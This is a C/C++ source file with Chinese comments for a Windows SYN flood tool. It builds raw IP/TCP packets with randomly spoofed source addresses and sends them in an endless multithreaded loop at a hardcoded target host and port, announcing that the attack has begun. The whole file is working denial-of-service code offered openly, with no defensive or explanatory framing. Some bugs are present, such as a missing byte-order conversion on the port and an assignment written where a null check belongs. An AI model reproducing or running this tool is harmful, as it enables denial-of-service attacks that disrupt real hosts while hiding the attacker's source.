#include <stdlib.h>
#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <time.h>
#include<iostream>
using namespace std;
#pragma comment(lib,"ws2_32.lib")
#define PacketNum 1024

int MaxThread; //最大线程数量 
int CurrentThread = 0; //当前活动线程数量 
char SendBuff[PacketNum][60] = {0}; //1024个数据包
SOCKADDR_IN Sin;

typedef struct ip_hdr //定义IP首部
{    
        unsigned char h_verlen; //4位首部长度,4位IP版本号 
        unsigned char tos; //8位服务类型TOS 
        unsigned short total_len; //16位总长度（字节） 
        unsigned short ident; //16位标识 
        unsigned short frag_and_flags; //3位标志位 
        unsigned char ttl; //8位生存时间 TTL 
        unsigned char proto; //8位协议 (TCP, UDP 或其他) 
        unsigned short checksum; //16位IP首部校验和 
        unsigned int sourceIP; //32位源IP地址 
        unsigned int destIP; //32位目的IP地址 
} IP_HEADER;

typedef struct tcp_hdr //定义TCP首部 
{    
        USHORT th_sport; //16位源端口 
        USHORT th_dport; //16位目的端口 
        unsigned int th_seq; //32位序列号 
        unsigned int th_ack; //32位确认号 
        unsigned char th_lenres; //4位首部长度/6位保留字 
        unsigned char th_flag; //6位标志位 
        USHORT th_win; //16位窗口大小 
        USHORT th_sum; //16位校验和 
        USHORT th_urp; //16位紧急数据偏移量 
} TCP_HEADER;
 
typedef struct tsd_hdr //定义TCP伪首部,用于计算校检和
{    
        unsigned long saddr; //源地址 
        unsigned long  daddr; //目的地址 
        char mbz;
     
        char ptcl; //协议类型 
        unsigned short tcpl; //TCP长度 
} PSD_HEADER;

//函数声明
int setup(char *, char *);
    //生成数据包 
DWORD WINAPI send_packet(LPVOID); //发送数据函数 
USHORT checksum(USHORT *, int); //计算检验和函数 
void watchthread(void); //检测当前线程数量

 

//进行初始设置，计算特定ip，特定端口，特定tcp序列号的检验和，生成数据包 
int setup( char *DestIp, char *DestPort) 
{    
     char src_ip[20] = {0}; //源IP
        USHORT src_port; //源端口
        char dst_ip[20] = {0};//目的IP
        USHORT dst_port; //目的端口
        IP_HEADER IpHeader;
        TCP_HEADER TcpHeader;
        PSD_HEADER PsdHeader;

        if(strlen(DestIp) >= 16)
            {
          printf( "目的IP不对\n" );
          return -1;
         
           
    }

     strcpy( dst_ip, DestIp );

        if(atoi(DestPort) < 0 || atoi(DestPort) > 65535) 
            {
          printf( "目的端口不对\n" );
          return -1;
         
           
    }

     //定址
        Sin.sin_family = AF_INET;
        Sin.sin_port = atoi(DestPort);
        Sin.sin_addr.s_addr = inet_addr(dst_ip);
           
       srand((unsigned) time(NULL));//用于产生随机数
          
       for(int n = 0; n < PacketNum; n++) 
           {
            //填充IP首部 
            wsprintf(src_ip, "%d.%d.%d.%d", rand() % 250 + 1, rand() % 250 + 1, rand() % 250 + 1, rand() % 250 + 1);
               IpHeader.h_verlen = (4<<4 | sizeof(IpHeader)/sizeof(unsigned long));
               IpHeader.tos = 0;
               IpHeader.total_len = htons(sizeof(IpHeader)+sizeof(TcpHeader));
               IpHeader.ident = 1;
               IpHeader.frag_and_flags = 0x40;
               IpHeader.ttl = 128;
               IpHeader.proto = IPPROTO_TCP;
               IpHeader.checksum = 0;
               IpHeader.sourceIP = inet_addr(src_ip);
               IpHeader.destIP = inet_addr(dst_ip);
                 
            //填充TCP首部 
               TcpHeader.th_sport = htons( rand()%60000 + 1 ); //源端口号 
               TcpHeader.th_dport = htons( atoi(DestPort) );
         
               TcpHeader.th_seq = htonl( rand()%900000000 + 1 );
         
               TcpHeader.th_ack = 0;
         
               TcpHeader.th_lenres = (sizeof(TcpHeader)/4<<4|0);
         
               TcpHeader.th_flag = 2; //0,2,4,8,16,32->FIN,SYN,RST,PSH,ACK,URG 
               TcpHeader.th_win = htons(512);
         
               TcpHeader.th_sum = 0;
            TcpHeader.th_urp = 0;
          
                  
               PsdHeader.saddr = IpHeader.sourceIP;
               PsdHeader.daddr = IpHeader.destIP;
               PsdHeader.mbz = 0;
               PsdHeader.ptcl = IPPROTO_TCP;
               PsdHeader.tcpl = htons(sizeof(TcpHeader));
                  
               //计算TCP校验和 
               memcpy( SendBuff[n], &PsdHeader, sizeof(PsdHeader) );
         
               memcpy( SendBuff[n] + sizeof(PsdHeader), &TcpHeader, sizeof(TcpHeader) );
         
               TcpHeader.th_sum = checksum( (USHORT *) SendBuff[n], sizeof(PsdHeader) + sizeof(TcpHeader) );

               //计算IP检验和
               memcpy( SendBuff[n], &IpHeader, sizeof(IpHeader) );
               memcpy( SendBuff[n] + sizeof(IpHeader), &TcpHeader, sizeof(TcpHeader) );
               memset( SendBuff[n] + sizeof(IpHeader) + sizeof(TcpHeader), 0, 4 );
               IpHeader.checksum = checksum( (USHORT *) SendBuff[n], sizeof(IpHeader) + sizeof(TcpHeader) );

            memcpy( SendBuff[n], &IpHeader, sizeof(IpHeader) );
         
               memcpy( SendBuff[n] + sizeof(IpHeader), &TcpHeader, sizeof(TcpHeader) );
          
    } 
           return 1;
     
}

//向目标主机发送syn数据包
DWORD WINAPI send_packet(LPVOID P) 
{
     SOCKET SendSocket;
     
        BOOL Flag;
     
        int Timeout;
     
        int *T = (int *)P;
     int Tmp = *T;

        //建立原生数据socket 
        SendSocket = WSASocket(AF_INET, SOCK_RAW, IPPROTO_RAW, NULL, 0, WSA_FLAG_OVERLAPPED);
     
        if(SendSocket == INVALID_SOCKET) 
            {
         
                CurrentThread--;
         
                return 0;
         
           
    }

        //设置自己填充数据包 
         Flag = TRUE;
     
         if(setsockopt(SendSocket, IPPROTO_IP, IP_HDRINCL, (char *)&Flag, sizeof(Flag)) == SOCKET_ERROR) 
             {
           printf("Setsockopt发生错误\n");
         
                 CurrentThread--;
         
                 return 0;
         
            
    }

         //设置超时时间 
         Timeout = 1000;
     
         if (setsockopt(SendSocket, SOL_SOCKET, SO_SNDTIMEO, (char *) &Timeout, sizeof(Timeout)) == SOCKET_ERROR) 
             {
           CurrentThread--;
         
                 return 0;
         
            
    }

         //发送数据包 
         int Ret = sendto(SendSocket, SendBuff[Tmp], sizeof(IP_HEADER) + sizeof(TCP_HEADER), 0, (struct sockaddr *) &Sin, sizeof(Sin));
         if (Ret == SOCKET_ERROR) 
             {
           printf("ErrorCode:%d\n", GetLastError());
         
                 CurrentThread--;
           return 0;
         
            
    } 
         else 
             {
         
                 CurrentThread--;
                 return 1;
         
            
    } 
}


//检测当前线程数量，如果大于等于最大线程数量则休眠0.1秒等待其他线程退出
void watchthread() 
{
     while(1)
            {
          if ( CurrentThread >= MaxThread ) 
                    {
               Sleep(100);
             
                   
        }
          else
               break;
         
           
    } 
}


//计算检验和
USHORT checksum(USHORT *buffer,int size) 
{    
        unsigned long cksum = 0;

     while (size > 1) 
            {
          cksum += *buffer++;
         
                size -= sizeof(USHORT);
         
           
    }

        if (size) 
            {
          cksum += *(UCHAR *) buffer;
         
           
    }

        cksum = (cksum >> 16) + (cksum & 0xffff);
     
        cksum += (cksum >> 16);
            
        return (USHORT) (~cksum);
     
}


//main函数 
//int main(int argc, char *argv[]) 
int main()
{    
        WSADATA WSAData;
     
        DWORD ThreadID = 1;
     
        HANDLE ThreadHandle = NULL;

        //if (argc != 4) 
        //{
     // printf( "\n%s\t<TargetIP>\t<TargetPort>\t<MaxThread>\n", argv[0] ); 
          //  return -1; 
        //}

        if ( WSAStartup(MAKEWORD(2, 2), &WSAData) != 0 ) 
            { 
                        printf( "初始化WSAStartu失败\n" );
                 
                        return -1;
                 
                 
               }

            if (/*atoi(argv[3]) > 0 && atoi(argv[3])*/90 < 150) 
                { 
                            MaxThread = 90/*atoi(argv[3])*/;
                     
                       
                   } 
                else 
                    {
                     
                            printf( "最大线程数量错误，必须大于0且小于150" );
                     
                            return -1;
                     
                       
                }

                    //初始化数据包，储存到数组当中。 
                    if(setup("192.168.0.111","80") == 1) 
                        { 
                                    printf( "初始化完成\n" );
                             
                               
                           } 
                        else 
                            {
                             
                                    printf( "初始化失败\n" );
                             
                                    return -1;
                             
                               
                        }

                            printf( "攻击开始...\n" );

        while (1) 
            { 
                         ThreadID = 1;

                   for(int Tmp = 0; Tmp < PacketNum; Tmp++)
                   { 
                                  watchthread();
                       
                                  ThreadID++;
                                  ThreadHandle = CreateThread(NULL, 0, send_packet, &Tmp, 0, &ThreadID);
                                  if ( ThreadHandle = NULL ) 
                        {
                CurrentThread--;
             
                       
        } 
                    else 
                        {
             
                            CurrentThread++;
             
                       
        }
   CloseHandle(ThreadHandle);
  
             }
 
       }
    int m;
 cin>>m;
 WSACleanup();
     
        return 0;
     
}

